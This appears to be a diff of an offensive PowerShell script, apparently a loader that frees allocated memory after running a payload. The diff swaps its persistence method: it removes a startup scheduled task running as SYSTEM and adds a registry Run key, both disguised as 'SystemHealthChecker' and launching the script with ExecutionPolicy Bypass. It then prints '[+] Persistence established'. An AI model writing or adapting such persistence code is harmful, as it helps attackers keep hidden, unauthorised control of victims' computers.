@@ -47,15 +47,13 @@ try {
     # Free the allocated memory (optional, as the process may terminate)
     [System.Runtime.InteropServices.Marshal]::FreeHGlobal($address)
 
-    # Add persistence via Scheduled Task
-    $taskName = "SystemHealthChecker"
-    $taskAction = New-ScheduledTaskAction -Execute "powershell.exe" -Argument "-NoProfile -ExecutionPolicy Bypass -File `"$PSCommandPath`""
-    $taskTrigger = New-ScheduledTaskTrigger -AtStartup
-    $taskPrincipal = New-ScheduledTaskPrincipal -UserId "SYSTEM" -LogonType ServiceAccount -RunLevel Highest
-    $taskSettings = New-ScheduledTaskSettingsSet -AllowStartIfOnBatteries -DontStopIfGoingOnBatteries -StartWhenAvailable -RunOnlyIfNetworkAvailable
-    Register-ScheduledTask -TaskName $taskName -Action $taskAction -Trigger $taskTrigger -Principal $taskPrincipal -Settings $taskSettings -Force
+    # Add persistence via Registry (Run Key)
+    $regPath = "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run"
+    $regName = "SystemHealthChecker"
+    $regValue = "powershell.exe -NoProfile -ExecutionPolicy Bypass -File `"$PSCommandPath`""
+    Set-ItemProperty -Path $regPath -Name $regName -Value $regValue
 
-    Write-Host "[+] Persistence established via Scheduled Task."
+    Write-Host "[+] Persistence established via Registry."
 }
 catch {
     Write-Host "An error occurred: $_"
